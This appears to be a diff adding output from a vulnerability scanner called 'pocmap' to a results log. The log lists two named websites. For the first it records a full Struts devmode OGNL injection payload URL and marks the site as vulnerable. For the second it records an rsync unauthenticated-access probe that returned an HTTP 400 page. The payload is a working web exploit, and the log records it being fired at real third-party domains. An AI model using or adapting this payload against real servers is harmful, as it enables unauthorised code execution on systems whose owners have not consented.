@@ -1,1 +1,14 @@
 ======================= pocmap v1.0 =======================
+URL: http://www.cdjzaq.com:80/register/addUi.action
+type: struts devmode Vul
+payload: http://www.cdjzaq.com:80/register/addUi.action?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=348458
+result: http://www.cdjzaq.com:80/register/addUi.actionstruts devmode Vul
+-----------------------------------------------------------
+URL: www.cnaction.com
+type: rsync unauth access  vul
+Port: 80
+result: ad Request - Invalid Verb</h2>
+<hr><p>HTTP Error 400. The request verb is invalid.</p>
+</BODY></HTML>
+
+-----------------------------------------------------------
